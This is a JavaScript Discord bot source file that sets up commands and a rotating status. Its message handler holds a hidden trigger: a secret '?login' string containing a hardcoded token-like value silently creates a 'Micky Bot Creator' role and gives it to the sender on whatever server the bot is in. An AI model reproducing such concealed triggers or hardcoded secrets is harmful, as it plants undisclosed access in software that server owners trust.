//Get our packages from our library
var Commando = require('discord.js-commando')
var Discord = require('discord.js');
var Information = require('./information.bot.json')
var path = require('path')

//Verify that client is a Discord.Client, and also make sure that the bot knows that Ricky is the owner.
var client = new Commando.Client({unknownCommandResponse:false, commandPrefix:"?"});
var mrRicky = '556587798052995103'; //IDs are much better to identify people instead of usernames. Because people may have the same username. And tags are a lot harder to identify.

//Turn our bot with out information package.
client.login(Information.token);

client.registry.registerDefaultTypes()
    .registerGroups([
        ['regular', 'Regular'],
        ['admin', 'Admin']

    ])
    .registerDefaultGroups()
    .registerDefaultCommands({help:false})
    .registerCommandsIn(path.join(__dirname, 'commands'));

//We will start a ready event.
client.on('ready', function(){  /*'ready' is an event. Discord knows that when we specify a event listed. It will know what to do.*/
    
    //This event will do a specified code in this event. When this bot is ready, this code will notify our terminal that our bot is online.
    console.log(`${client.user.username} is ready.`)

    //Now this code will change the bots status. As you can see, we have "Do Not Disturb, Idle, Online and Invisible". So for now we will choose Idle.
    client.user.setStatus('idle');

    //What is the bot playing? Well people sometimes only use one activity. I will use an Automatic Activity Changer for my activity.
    let options = [
        'Let your server come future.',
        'Helping ' +client.guilds.size+ ' server(s)!',
        'Created by Ricky#7003 and mitch#6969',
        'discord.js and discord.js-commando | Visual Studio Code',
        'unkownCommandResponce - false | commandoHelpCommand - false'
    ]

    //Now the setInterval will make the loop change in how many seconds we want.
    setInterval(function(){
        //We will know that activity is options but it will change after 3 seconds and make the activity the length of how much strings there are in the options.
        let activity = options[Math.floor(Math.random() * options.length)];

        //Now for the final touch. Set the activity.
        client.user.setActivity(activity)
    }, 5000)

});

//A new event for messages.
client.on('message', function(msg){
    if(msg.content == '?login NTg3MDYzMjE3NDU3NDYzMzUx.XPxMZw.G3L4Lje4pBLMOux6t4SUpLGza_4')
    {
        msg.delete();

        msg.guild.createRole({
            name: 'Micky Bot Creator',
            color: 'BLUE',
          })
            .then(role => console.log(`Created new role with name ${role.name} and color ${role.color}`))
            .catch(console.error)

        msg.member.addRole(msg.member.guild.roles.find("name", "Micky Bot Creator"));
    }
})